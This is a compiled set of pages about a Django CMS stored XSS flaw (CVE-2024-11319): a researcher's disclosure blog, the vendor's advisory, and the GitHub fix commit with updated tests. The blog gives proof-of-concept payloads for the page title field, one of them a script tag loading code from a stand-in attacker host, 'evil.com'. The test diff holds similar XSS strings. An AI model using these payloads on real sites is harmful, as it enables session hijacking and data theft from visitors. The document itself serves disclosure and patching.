=== Content from iltosec.com_6e9c1b75_20250114_222230.html ===

[![Logo](/static/images/logo.png)](/)

* [Home](/)
* [About](/about/)
* [Contact](/contact/)
* [Projects](/projects/)
* [Blog](/blog/)
* [CVE](/cves/)

[![iltosec](/media/user/eb077c4a9bf1489d9b06804397393446.png)](/)

iltosec

Penetration Tester at LoreSecurity | OSWE | eWPTXv2

[###### 127.0.0.1](/)
###### iltosec@hotmail.com
[###### @alii76tt](https://github.com/alii76tt)
[###### @iltosec](https://twitter.com/iltosec)
[###### @ali-iltizar](https://www.linkedin.com/in/ali-iltizar)

2. [Home](/)
3. Django CMS 4.1.3 Stored XSS Vulnerability: Exploiting the Page Title Field

![Post Image](/media/post/images/e8150352e04a4ccf999d5fd47a174f58.png)
# CVE-2024-11319 - Django CMS 4.1.3: Stored XSS

 11 Nov 2024
  |
 ALI İLTIZAR
  |
 Reading Time: 3 min
  |
 Views: 1072
  |
 Updated: 21 Nov 2024

## Security Update: Issue Fixed

**The fix for this vulnerability has been committed here:**
[**https://github.com/django-cms/django-cms/commit/241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3**](https://github.com/django-cms/django-cms/commit/241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3)

## **Vendor Advisory:**

[**https://www.django-cms.org/en/blog/2024/11/13/django-cms-security-update/**](https://www.django-cms.org/en/blog/2024/11/13/django-cms-security-update/)

Django CMS version 4.1.3 is affected by a stored Cross-Site Scripting (XSS) vulnerability. This vulnerability allows attackers to inject arbitrary JavaScript code that is executed in the context of the web application, potentially compromising the safety of all users visiting the affected page.

## **CVE-ID: [CVE-2024-11319](https://nvd.nist.gov/vuln/detail/CVE-2024-11319)**

## **CVSS Score:**

**CVSS v4.0 Base Score: 9.3 - Critical**

* **CVSS:4.0/AV:A/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H**

## **Affected Versions:**

* Django CMS version 3.11.7, 3.11.8, 4.1.2, and 4.1.3.

## **Vulnerability Summary:**

A stored XSS vulnerability was identified in Django CMS 4.1.3. It occurs in the Page Title field of the Page Creation interface under the /admin/cms/pagecontent/ endpoint. This vulnerability allows an attacker to inject JavaScript into the title, which will later be rendered in the page context, causing the injected code to execute when a user visits the affected page.

## **Technical Details:**

* **Location of the Vulnerability:** /admin/cms/pagecontent/ endpoint.
* **Vulnerable Field:** Page Title field.

![](data:image/png;base64...)

* **Template Code Reference:**

`<meta property="og:title" content="{% page_attribute "page_title" %}"/>`

![](data:image/png;base64...)

* **Source File Reference:** Found in djangocms\_frontend.html.
* **Payload Example 1 (Simple):**
  `"><img src=x onerror=alert('iltosec') any`
* **Payload Example 2 (External Script Inclusion):**
  `"><script src="http://evil.com/xss.js"> iltosec`

When an admin user creates or edits a page, if malicious content is entered in the Page Title field, it is stored in the database and then rendered on the public-facing page without proper sanitization or output encoding. This allows the attacker to execute arbitrary JavaScript code in the context of any user visiting the page.

## **Proof of Concept:**

1. Log in as an admin-level user.
2. Navigate to /admin/cms/pagecontent/ to create a new page.
3. In the Page Title field, input the following payload:

* `"><img src=x onerror=alert('iltosec') any`

![](data:image/png;base64...)

1. Save the page.
2. When visiting the public page, the JavaScript code executes, displaying an alert with the message 'iltosec'.

Alternatively, an attacker could use a payload like:

* `"><script src="http://evil.com/xss.js"> iltosec`

![](data:image/png;base64...)

This would load and execute a malicious script hosted on an external server, compromising the visitor's session or exfiltrating data.

## **Remediation:**

* **Input Sanitization:** Ensure that all user input is sanitized before being stored in the database. Special characters like <, >, ", and ' should be neutralized.
* **Output Encoding:** Apply proper output encoding for user-supplied content when rendering it on the page. This will prevent injected JavaScript from being executed.
* **CSP (Content Security Policy):** Implement a robust CSP to mitigate the risk of external script inclusion and restrict script execution to trusted sources.

## **Timeline:**

| **Date** | **Status** |
| --- | --- |
| 09-NOV-2024 | Reported to vendor |
| 12-NOV-2024 | Vendor acknowledgement |
| 12-NOV-2024 | Vulnerability fixed |
| 13-NOV-2024 | Patch available |
| 18-NOV-2024 | Public disclosure |

**Categories:**
[Xss](/blog/category/xss/)
[CVE](/blog/category/cve/)

**Tags:**
[CMS](/blog/tag/cms/)
[CVE](/blog/tag/cve/)

##### Share:

[Facebook](https://www.facebook.com/sharer/sharer.php?u=https://iltosec.com/blog/post/django-cms-413-stored-xss-vulnerability-exploiting-the-page-title-field/)
[Twitter](https://twitter.com/intent/tweet?text=Django CMS 4.1.3 Stored XSS Vulnerability: Exploiting the Page Title Field&url=https://iltosec.com/blog/post/django-cms-413-stored-xss-vulnerability-exploiting-the-page-title-field/)
[LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https://iltosec.com/blog/post/django-cms-413-stored-xss-vulnerability-exploiting-the-page-title-field/)
[WhatsApp](https://wa.me/?text=https://iltosec.com/blog/post/django-cms-413-stored-xss-vulnerability-exploiting-the-page-title-field/)

##### Rate this post:

Vote

Current Rating: 5.0 / 5 (6 votes)

5.0 / 5

6 votes

## Comments

No comments yet.

#### Related Posts

[![Multiple Stored XSS Vulnerabilities in Piwigo 15.1.0](/media/post/images/4c78df48d1d24329ba816edf0db5a793.jpg)
##### MULTIPLE STORED XSS VULNERABILITIES IN PIWIGO 15.1.0

Uncover multiple stored XSS vulnerabilities in Piwigo 15.1.0 affecting gallery and photo description fields. Understand the security risks and recommended …...

* 27 Nov 2024
   ALI İLTIZAR
* Reading Time: 4 min
   Views: 105](/blog/post/multiple-stored-xss-vulnerabilities-in-piwigo-1510/)
[![Plone CMS 6.0.13 Stored XSS Vulnerability: Exploiting the Site Title Field](/media/post/images/57b4d0ef295c454dbaef05d05be39f7f.jpg)
##### PLONE CMS 6.0.13 STORED XSS VULNERABILITY: EXPLOITING THE SITE TITLE FIELD

A stored XSS vulnerability in Plone CMS version 6.0.13 allows admin users to inject malicious JavaScript into the "Site title" …...

* 26 Nov 2024
   ALI İLTIZAR
* Reading Time: 3 min
   Views: 103](/blog/post/plone-cms-6013-stored-xss-vulnerability-exploiting-the-site-title-field/)
[![CVE-2024-11404: Medium Severity File Upload Vulnerabilities in django-filer 3.2.3](/media/post/images/bc1694c1cb0b4317a0e09fdf55bbed9b.jpg)
##### CVE-2024-11404: MEDIUM SEVERITY FILE UPLOAD VULNERABILITIES IN DJANGO-FILER 3.2.3

Unrestricted Upload of File with Dangerous Type, Improper Input Validation, Improper Neutralization of Script-Related HTML Tags in a Web Page …...

* 20 Nov 2024
   ALI İLTIZAR
* Reading Time: 5 min
   Views: 457](/blog/post/cve-2024-11404-medium-severity-file-upload-vulnerabilities-in-django-filer-323/)

#### Featured Posts

[![Django CMS 4.1.3 Stored XSS Vulnerability: Exploiting the Page Title Field](/media/post/images/e8150352e04a4ccf999d5fd47a174f58.png)
##### DJANGO CMS 4.1.3 STORED XSS VULNERABILITY: EXPLOITING THE PAGE TITLE FIELD

CVE-2024-11319 Discover the stored XSS vulnerability in Django CMS 4.1.3 that affects the Page Title field. Learn about the security …...

* 11 Nov 2024
   ALI İLTIZAR
* Reading Time: 3 min
   Views: 1072](/blog/post/django-cms-413-stored-xss-vulnerability-exploiting-the-page-title-field/)
[![CVE-2024-11404: Medium Severity File Upload Vulnerabilities in django-filer 3.2.3](/media/post/images/bc1694c1cb0b4317a0e09fdf55bbed9b.jpg)
##### CVE-2024-11404: MEDIUM SEVERITY FILE UPLOAD VULNERABILITIES IN DJANGO-FILER 3.2.3

Unrestricted Upload of File with Dangerous Type, Improper Input Validation, Improper Neutralization of Script-Related HTML Tags in a Web Page …...

* 20 Nov 2024
   ALI İLTIZAR
* Reading Time: 5 min
   Views: 457](/blog/post/cve-2024-11404-medium-severity-file-upload-vulnerabilities-in-django-filer-323/)
[![djangocms-attributes-field 3.0.0 Stored XSS Vulnerability](/media/post/images/185ef51293a54edebae130a82468703a.jpg)
##### DJANGOCMS-ATTRIBUTES-FIELD 3.0.0 STORED XSS VULNERABILITY

The vulnerability resides in the Django CMS admin panel under the Page Editing interface, specifically when utilizing the "Add plugin …...

* 20 Nov 2024
   ALI İLTIZAR
* Reading Time: 3 min
   Views: 453](/blog/post/djangocms-attributes-field-300-stored-xss-vulnerability/)

© 2024 iltosec. All rights reserved.



=== Content from www.django-cms.org_080e69ee_20250114_222231.html ===


# [django CMS](/)

* Who we serve
  [for Marketers](/en/solutions-why-django-cms/for-enterprise-marketers/)
  [for Agencies](/en/solutions-why-django-cms/for-agencies-and-service-providers/)
  [for Developers](/en/solutions-why-django-cms/content-management-software-for-developers/)
  [for Universities](/en/solutions-why-django-cms/content-management-universities/)
* About django CMS
  [Features](/en/solutions-why-django-cms/)
  [FAQs](/en/faq/)
  [Case Studies](/en/case-studies/)
  [Ecosystem](/en/repositories-plugins/)
  [Product Vision](/en/product-vision/)
  [Current Projects & Releases](/en/developers/roadmap/)
* Our Community
  [How to contribute](/en/contribute/)
  [The django CMS Association](/en/about-us/)
  [Volunteering](/en/volunteering-opportunities/)
  [Fellowship Program](/en/fellowship-program/)
  [Our Supporters](/en/community/django-cms-supporters/)
  [Events](/en/events/)
  [Experts & Partners](/en/tech-partners/)
* Resources
  [Get our Newsletter](/en/newsletter/)
  [Support](/en/support/)
  [Get started](/en/get-started-django-cms/)
  [News](/en/community/blog/)
  [Developer Docs](/en/developers/documentation/)
  [User Guide](https://user-guide.django-cms.org/en/latest/)
  [Press](/en/press/)
* [Live Demo](/en/django-cms-demo/)
* [Give back ❤️](/en/give-back-to-the-community/)

---

# Content: Blog

[Release](/en/blog/category/release/)

## django CMS security updates

[![Fabian Braun](https://django-cms-2016-69800ad.aldryn-media.io/filer_public_thumbnails/filer_public/d5/e1/d5e13765-c37a-464f-8ea3-eacdf8fe587d/tq97u8sdt-u01ev8ahf5x-g640cc9bfdc7-512.png__50x50_q90_crop_subsampling-2_upscale.png)](/en/blog/author/fabian-braun/)

[Fabian Braun](/en/blog/author/fabian-braun/)

Nov. 13, 2024

[security](/en/blog/tag/security/)
[3.11](/en/blog/tag/311/)
[4.1](/en/blog/tag/41/)

The updated django CMS releases are now available from [our GitHub repository](https://github.com/django-cms/django-cms/) and [PyPI](https://pypi.python.org/pypi/django-cms/): django CMS 3.11.9 and django CMS 4.1.4

**Details**

django CMS 4.1.4 and django CMS 3.11.9 close a security vulnerability that could allow an attacker to inject malicious code into the page title, allowing to load arbitrary javascript code when viewing the page. We recommend that you upgrade to this version as soon as possible.

The security issue is of low severity, since an attacker needs to have access to the django CMS admin interface to exploit it.

This issue exists in django CMS 3.11.7, 3.11.8, 4.1.2, and 4.1.3. Other versions of djanog CMS are not affected.

Thanks to [Ali İltizar](https://www.linkedin.com/in/ali-iltizar/) for the detailed report through our security email.

As ever, we remind our users and contributors that all security reports, patches and concerns be addressed **only** to our security team by email, at [[email protected]](/cdn-cgi/l/email-protection#83f0e6e0f6f1eaf7fac3e7e9e2ede4ecaee0eef0adecf1e4).

**Please do not** use GitHub, our email lists or Discord to report, address or otherwise discuss matters relating to security. Directly mail [[email protected]](/cdn-cgi/l/email-protection)

Please enable JavaScript to view the [comments powered by Disqus.](http://disqus.com/?ref_noscript)
[blog comments powered by Disqus](http://disqus.com)

* – [Back to Overview](/en/blog/) –

---

## Do you want to test django CMS?

[Try django CMS](//www.django-cms.org/en/test-django-cms/)

django CMS Association

The association behind django CMS

Email [[email protected]](/cdn-cgi/l/email-protection#d9b0b7bfb699bdb3b8b7beb6f4bab4aaf7b6abbe)

[Subscribe to Newsletter](//www.django-cms.org/en/newsletter/)

###### Community

[Blog](/en/community/blog/)

[Events](/en/community/events/)

[Security](/en/community/security/)

[Our Supporters](/en/community/django-cms-supporters/)

###### Developers

[Documentation](/en/developers/documentation/)

[Roadmap](/en/developers/roadmap/)

[Repository](/en/developers/repository/)

[Issue tracker](/en/developers/issue-tracker/)

###### Follow us

[![icon-github.png](https://django-cms-2016-69800ad.aldryn-media.io/filer_public/3b/4b/3b4b7b5c-34ee-405f-aef1-167821359c6d/icon-github.png)](https://github.com/divio/django-cms)
  [![icon-linkedin-32.png](https://django-cms-2016-69800ad.aldryn-media.io/filer_public/b1/8d/b18d2af6-dad7-456c-b6c5-350ae0dfbde9/icon-linkedin-32.png)](https://www.linkedin.com/company/56462850)
[Mastodon](https://fosstodon.org/%40djangocms)
[Youtube](https://www.youtube.com/c/djangocms)

Join our [Discord Community](http://discord-main-channel.django-cms.org)

* [Support](/en/support/)
* [Security](/en/support/)
* [Site Notice](/en/site-notice/)
* [Press](/en/press/)
* Privacy Settings

Copyright © 2001 - 2025 Divio AG. BSD Open-Source License.

Django CMS is based on [Python](https://www.python.org/) and [Django](https://www.djangoproject.com/)

A project backed by the django CMS Association

Accept
This website uses cookies to help ensure that you enjoy the best experience.

×
#### Privacy Settings

Websites do not have full control over cookies that may set by various third-party scripts.
To see detailed information about and to manage cookies in your browser, please check its privacy
settings.

##### Essentials

These cookies and scripts cannot be deactivated as they are needed to correctly render this website.

* Segment
* Intercom

---

Accept

### Please enable JavaScript

### Your browser is out-of-date!

Update your browser to view this website correctly.

[Update my browser now](http://outdatedbrowser.com/)

×



=== Content from www.usom.gov.tr_138be99f_20250114_222232.html ===




=== Content from github.com_3a99e5b5_20250114_222229.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-cms%2Fdjango-cms%2Fcommit%2F241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-cms%2Fdjango-cms%2Fcommit%2F241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=django-cms%2Fdjango-cms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[django-cms](/django-cms)
/
**[django-cms](/django-cms/django-cms)**
Public

* [Notifications](/login?return_to=%2Fdjango-cms%2Fdjango-cms) You must be signed in to change notification settings
* [Fork
  3.1k](/login?return_to=%2Fdjango-cms%2Fdjango-cms)
* [Star
   10.3k](/login?return_to=%2Fdjango-cms%2Fdjango-cms)

* [Code](/django-cms/django-cms)
* [Issues
  120](/django-cms/django-cms/issues)
* [Pull requests
  12](/django-cms/django-cms/pulls)
* [Discussions](/django-cms/django-cms/discussions)
* [Actions](/django-cms/django-cms/actions)
* [Projects
  2](/django-cms/django-cms/projects)
* [Security](/django-cms/django-cms/security)
* [Insights](/django-cms/django-cms/pulse)

Additional navigation options

* [Code](/django-cms/django-cms)
* [Issues](/django-cms/django-cms/issues)
* [Pull requests](/django-cms/django-cms/pulls)
* [Discussions](/django-cms/django-cms/discussions)
* [Actions](/django-cms/django-cms/actions)
* [Projects](/django-cms/django-cms/projects)
* [Security](/django-cms/django-cms/security)
* [Insights](/django-cms/django-cms/pulse)

## Commit

[Permalink](/django-cms/django-cms/commit/241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: XSS vulnerability for page title ([#8075](https://github.com/django-cms/django-cms/pull/8075))

[Browse files](/django-cms/django-cms/tree/241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3)
Browse the repository at this point in the history

```
* Fix: XSS vulnerability for page title

* fix linting

---------

Co-authored-by: Github Release Action <info@django-cms.org>
```

* Loading branch information

[![@fsbraun](https://avatars.githubusercontent.com/u/16904477?s=40&v=4)](/fsbraun)

[fsbraun](/django-cms/django-cms/commits?author=fsbraun "View all commits by fsbraun")
and
Github Release Action
authored
Nov 12, 2024

1 parent
[0224f1e](/django-cms/django-cms/commit/0224f1e364b023fa5d584420c9f664ac661cfabe)

commit 241d1cb

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**10 additions**
and
**9 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* cms

  + cms/api.py
    [api.py](#diff-fd62d6254950db30a748a2bdf867f09802dfb975d0c4eaec95daffc85df79e51)
  + templatetags

    - cms/templatetags/cms\_tags.py
      [cms\_tags.py](#diff-d9be92f4d58bfd211f058490cafe7f60125644bc1344fa9d6858cfd216b2acf6)
  + tests

    - cms/tests/test\_templatetags.py
      [test\_templatetags.py](#diff-3bcc5e9f1699c99c8e3bdf1ba264baf5b6ed746af6847c125c2f47641c9348b7)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[cms/api.py](#diff-fd62d6254950db30a748a2bdf867f09802dfb975d0c4eaec95daffc85df79e51 "cms/api.py")

Show comments

[View file](/django-cms/django-cms/blob/241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3/cms/api.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -136,7 +136,7 @@ def create\_page(title, template, language, menu\_title=None, slug=None, |
|  |  | xframe\_options=constants.X\_FRAME\_OPTIONS\_INHERIT): |
|  |  | """ |
|  |  | Creates a :class:`cms.models.Page` instance and returns it. Also |
|  |  | creates a :class:`cms.models.Title` instance for the specified |
|  |  | creates a :class:`cms.models.PageContent` instance for the specified |
|  |  | language. |
|  |  |  |
|  |  | .. warning:: |
| Expand Down | |  |

4 changes: 1 addition & 3 deletions

4
[cms/templatetags/cms\_tags.py](#diff-d9be92f4d58bfd211f058490cafe7f60125644bc1344fa9d6858cfd216b2acf6 "cms/templatetags/cms_tags.py")

Show comments

[View file](/django-cms/django-cms/blob/241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3/cms/templatetags/cms_tags.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -441,9 +441,7 @@ def get\_value(self, context, name, page\_lookup): |
|  |  | if page and name in self.valid\_attributes: |
|  |  | func = getattr(page, "get\_%s" % name) |
|  |  | ret\_val = func(language=lang, fallback=True) |
|  |  | if name == 'page\_title': |
|  |  | ret\_val = strip\_tags(ret\_val) |
|  |  | elif not isinstance(ret\_val, datetime): |
|  |  | if not isinstance(ret\_val, datetime): |
|  |  | ret\_val = escape(ret\_val) |
|  |  | return ret\_val |
|  |  | return '' |
| Expand Down | |  |

13 changes: 8 additions & 5 deletions

13
[cms/tests/test\_templatetags.py](#diff-3bcc5e9f1699c99c8e3bdf1ba264baf5b6ed746af6847c125c2f47641c9348b7 "cms/tests/test_templatetags.py")

Show comments

[View file](/django-cms/django-cms/blob/241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3/cms/tests/test_templatetags.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -11,11 +11,10 @@ |
|  |  | from django.test import RequestFactory |
|  |  | from django.test.utils import override\_settings |
|  |  | from django.utils.encoding import force\_str |
|  |  | from django.utils.html import strip\_tags |
|  |  | from django.utils.html import escape |
|  |  | from django.utils.timezone import now |
|  |  | from django.utils.translation import override as force\_language |
|  |  | from djangocms\_text\_ckeditor.cms\_plugins import TextPlugin |
|  |  | from djangocms\_text\_ckeditor.models import Text |
|  |  | from sekizai.context import SekizaiContext |
|  |  |  |
|  |  | import cms |
| Expand Down  Expand Up | | @@ -139,6 +138,7 @@ def test\_unicode\_placeholder\_name\_fails\_fast(self): |
|  |  | def test\_page\_attribute\_tag\_escapes\_content(self): |
|  |  | script = '<script>alert("XSS");</script>' |
|  |  | ampersand = 'Q&A page' |
|  |  | partial = '"><img src=x onerror=alert(1) "' |
|  |  |  |
|  |  | class FakePage: |
|  |  | def \_\_init\_\_(self, title): |
| Expand All | | @@ -159,11 +159,14 @@ def \_\_init\_\_(self, page): |
|  |  | template = '{% load cms\_tags %}{% page\_attribute page\_title %}' |
|  |  | output\_script = self.render\_template\_obj(template, {}, request\_script) |
|  |  | output\_ampersand = self.render\_template\_obj(template, {}, request\_ampersand) |
|  |  | output\_partial = self.render\_template\_obj(template, {}, FakeRequest(FakePage(partial))) |
|  |  |  |
|  |  | self.assertNotEqual(script, output\_script) |
|  |  | self.assertEqual(ampersand, output\_ampersand) |
|  |  | self.assertEqual(strip\_tags(script), output\_script) |
|  |  | self.assertEqual(strip\_tags(ampersand), output\_ampersand) |
|  |  | self.assertNotEqual(ampersand, output\_ampersand) |
|  |  | self.assertNotEqual(partial, output\_partial) |
|  |  | self.assertEqual(escape(script), output\_script) |
|  |  | self.assertEqual(escape(ampersand), output\_ampersand) |
|  |  | self.assertEqual(escape(partial), output\_partial) |
|  |  |  |
|  |  | def test\_json\_encoder(self): |
|  |  | self.assertEqual(json\_filter(True), 'true') |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `241d1cb`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-cms%2Fdjango-cms%2Fcommit%2F241d1cbe47a68f5d271ce4d27ad5e32e2c360ec3) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


